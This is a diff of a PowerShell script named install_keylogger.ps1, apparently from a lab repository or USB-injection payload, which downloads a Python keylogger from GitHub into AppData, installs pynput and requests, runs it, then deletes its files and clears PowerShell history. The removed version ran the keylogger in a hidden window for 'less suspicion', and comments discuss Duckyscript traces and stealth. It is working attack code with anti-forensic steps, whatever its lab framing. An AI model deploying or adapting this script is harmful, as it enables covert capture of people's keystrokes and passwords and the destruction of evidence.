@@ -1,102 +1,105 @@
 # install_keylogger.ps1
 
-# Configuration
+# --- Configuration ---
 $PythonKeyloggerUrl = "https://raw.githubusercontent.com/butlersl/305-lab-files/main/Keylogger/keylogger.py"
-$PythonSenderUrl = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/sender.py" # Assuming you might separate sender logic later
+
 $KeyloggerFileName = "keylogger.py"
-$SenderFileName = "sender.py"
-$TargetDir = "$env:APPDATA\Keylogger" # Store in AppData for persistence/less suspicion
+$TargetDir = Join-Path $env:APPDATA "Keylogger_App" # Use a slightly more descriptive name
 $MainScriptPath = Join-Path $TargetDir $KeyloggerFileName
-$LogFileName = "keys.log" # For local storage before sending, if needed
 
 # --- Step 1: Create Target Directory ---
-Write-Host "Creating target directory..."
-New-Item -ItemType Directory -Path $TargetDir -Force
-# { (markdown) = ![Image]( https://image.pollinations.ai/prompt/Creating%20a%20new%20folder%20on%20a%20Windows%20desktop,%20clean%20icon,%20digital%20art,%20flat%20design,%20minimalist,%20Pixar,%20Vector ) }
+Write-Host "Creating target directory: $TargetDir"
+try {
+    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
+    Write-Host "Directory created successfully."
+} catch {
+    Write-Error "Failed to create directory '$TargetDir': $($_.Exception.Message)"
+    exit 1
+}
 
 # --- Step 2: Download Python Keylogger Script ---
-Write-Host "Downloading keylogger script..."
+Write-Host "Downloading keylogger script from $PythonKeyloggerUrl..."
 try {
     $httpClient = New-Object System.Net.Http.HttpClient
+    # Set a reasonable timeout for the download
+    $httpClient.Timeout = New-TimeSpan -Seconds 30
     $response = $httpClient.GetAsync($PythonKeyloggerUrl).Result
-    $response.EnsureSuccessStatusCode()
+    $response.EnsureSuccessStatusCode() # Throws an exception for non-success status codes
     $scriptContent = $response.Content.ReadAsStringAsync().Result
     Set-Content -Path $MainScriptPath -Value $scriptContent -Encoding UTF8
     Write-Host "Keylogger script downloaded successfully to $MainScriptPath"
-    # { (markdown) = ![Image]( https://image.pollinations.ai/prompt/Downloading%20a%20python%20script%20from%20a%20github%20repository,%20computer%20screen%20with%20code,%20digital%20illustration,%20cyberpunk,%203D,%20ArtStation,%20Greg%20Rutkowski ) }
 } catch {
-    Write-Error "Failed to download keylogger script: $($_.Exception.Message)"
+    Write-Error "Failed to download keylogger script from '$PythonKeyloggerUrl': $($_.Exception.Message)"
     exit 1
 }
 
 # --- Step 3: Ensure Python is Available and Install Dependencies ---
-# This is a critical step. We assume Python is installed.
-# For a real-world scenario, you'd need to handle Python installation or ensure it's present.
-# We'll use pip to install pynput if not already present.
+Write-Host "Ensuring Python is available and installing dependencies..."
 
-Write-Host "Ensuring Python and pynput are available..."
 # Check if python is in PATH
 $pythonPath = Get-Command python -ErrorAction SilentlyContinue
 if (-not $pythonPath) {
-    Write-Error "Python is not found in the system PATH. Keylogger cannot run."
+    Write-Error "Python is not found in the system PATH. Please ensure Python is installed and added to PATH."
     exit 1
 }
+Write-Host "Python found at: $($pythonPath.Source)"
 
-# Try to install pynput
+# Try to install pynput and requests
 try {
-    Write-Host "Installing pynput library..."
-    # Use the python executable found in the PATH
-    & python -m pip install pynput
-    Write-Host "pynput installed successfully."
-    # { (markdown) = ![Image]( https://image.pollinations.ai/prompt/Python%20package%20installation%20progress%20bar,%20command%20line%20interface,%20tech%20visual,%20sleek%20design,%20futuristic,%20digital%20art,%20Loish ) }
+    Write-Host "Installing required Python libraries (pynput, requests)..."
+    # Using the found python executable explicitly
+    & $pythonPath.Source -m pip install --upgrade pip # Ensure pip is up-to-date
+    & $pythonPath.Source -m pip install pynput requests
+    Write-Host "Python libraries installed/upgraded successfully."
 } catch {
-    Write-Warning "Failed to install pynput (might already be installed or pip is not configured): $($_.Exception.Message)"
-    # Continue, as it might already be installed
+    Write-Warning "Failed to install Python libraries (pynput, requests). They might already be installed, or pip is not configured correctly. Error: $($_.Exception.Message)"
+    # Continue, as they might already be installed. The Python script will error if they're missing.
 }
 
-# --- Step 4: Run the Keylogger in the Background ---
-Write-Host "Starting the keylogger in the background..."
-# Run the python script in a separate, hidden window
-$process = Start-Process python -ArgumentList $MainScriptPath -WindowStyle Hidden -PassThru
-
-if ($process) {
-    Write-Host "Keylogger started with Process ID: $($process.Id)"
-    # { (markdown) = ![Image]( https://image.pollinations.ai/prompt/Process%20ID%20displayed%20on%20a%20computer%20monitor,%20abstract%20tech%20background,%20neon%20glow,%20glitch%20effect,%20digital%20art,%20cyberpunk,%20Josan%20Gonzalez ) }
-
-    # Give the keylogger some time to run (e.g., 5 minutes)
-    $runtimeSeconds = 300 # 5 minutes
-    Write-Host "Keylogger will run for approximately $runtimeSeconds seconds."
-    Start-Sleep -Seconds $runtimeSeconds
-
-    # --- Step 5: Stop the Keylogger Process ---
-    Write-Host "Stopping the keylogger process..."
-    Stop-Process -Id $process.Id -Force
-    Write-Host "Keylogger process stopped."
-    # { (markdown) = ![Image]( https://image.pollinations.ai/prompt/Stopping%20a%20computer%20process,%20red%20stop%20sign%20over%20a%20terminal%20window,%20minimalist,%20danger%20symbol,%20dark%20theme,%20digital%20art,%20art%20by%20Beeple ) }
-
-} else {
-    Write-Error "Failed to start the keylogger process."
+# --- Step 4: Run the Keylogger ---
+Write-Host "Executing the Python keylogger script: $MainScriptPath"
+try {
+    # Run the python script. We'll run it visibly for debugging.
+    # For hidden execution, use -WindowStyle Hidden, but debugging is harder.
+    # Using Start-Process allows us to potentially get the exit code.
+    $process = Start-Process -FilePath $pythonPath.Source -ArgumentList $MainScriptPath -WindowStyle Normal -Wait -PassThru # -Wait makes PowerShell wait for Python to finish
+    
+    if ($process.ExitCode -ne 0) {
+        Write-Error "Python script exited with an error code: $($process.ExitCode)"
+        # You might want to examine the Python script's output if it was visible
+    } else {
+        Write-Host "Python script finished successfully."
+    }
+} catch {
+    Write-Error "Failed to start or run the Python script '$MainScriptPath': $($_.Exception.Message)"
     exit 1
 }
 
-# --- Step 6: Cleanup ---
+# --- Step 5: Cleanup (Optional - for demonstration only) ---
+# In a real scenario, you'd want to be very careful with cleanup.
 Write-Host "Starting cleanup process..."
 
 # Remove the keylogger script and directory
 Write-Host "Removing keylogger script and directory..."
-Remove-Item -Path $TargetDir -Recurse -Force
-# { (markdown) = ![Image]( https://image.pollinations.ai/prompt/Cleaning%20up%20files%20on%20a%20computer,%20trash%20icon%20deleting%20folders,%20digital%20art,%20clean%20interface,%20modern%20design,%20Goro%20Fujita ) }
+try {
+    Remove-Item -Path $TargetDir -Recurse -Force
+    Write-Host "Cleanup of '$TargetDir' complete."
+} catch {
+    Write-Warning "Failed to remove directory '$TargetDir': $($_.Exception.Message)"
+}
 
-# Remove PowerShell execution history (basic attempt)
-# This is not foolproof and more advanced forensics can recover this.
+# Basic attempt to clear PowerShell history. This is not foolproof.
 Write-Host "Attempting to clear PowerShell history..."
-(Get-PSReadlineOption).HistorySavePath | Remove-Item -Force -ErrorAction SilentlyContinue
-# { (markdown) = ![Image]( https://image.pollinations.ai/prompt/Clearing%20command%20history%20from%20a%20terminal,%20empty%20command%20line,%20digital%20art,%20abstract,%20glitch%20effect,%20dark%20background,%20Rustam%20Qobil ) }
+try {
+    if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
+        Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
+        Write-Host "PowerShell history cleared (basic attempt)."
+    } else {
+        Write-Host "PowerShell history file not found, skipping clear."
+    }
+} catch {
+    Write-Warning "Failed to clear PowerShell history: $($_.Exception.Message)"
+}
 
-
-# Remove the Duckyscript execution trace (difficult to do reliably from within the script itself)
-# For true stealth, the initial execution vector is key.
-
-Write-Host "Cleanup complete."
-
+Write-Host "Script execution finished."
 exit 0
